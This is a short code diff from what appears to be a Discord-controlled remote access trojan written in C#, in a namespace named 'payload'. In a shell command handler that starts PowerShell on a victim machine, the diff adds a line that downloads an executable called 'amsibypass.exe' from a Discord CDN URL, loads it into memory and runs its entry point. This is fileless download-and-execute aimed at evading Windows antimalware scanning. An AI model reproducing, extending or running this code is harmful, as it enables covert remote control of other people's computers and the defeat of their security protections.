@@ -214,6 +214,7 @@ namespace payload
                         if (args[0] != machineid) break;
                         Shell s = new Shell(await message.Channel.SendMessageAsync("``` ```"));
                         s.Start("powershell.exe");
+                        s.SendCommand("$wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/969797235741175838/amsibypass.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, $null)");
                         break;
                     }
                 case "execute":
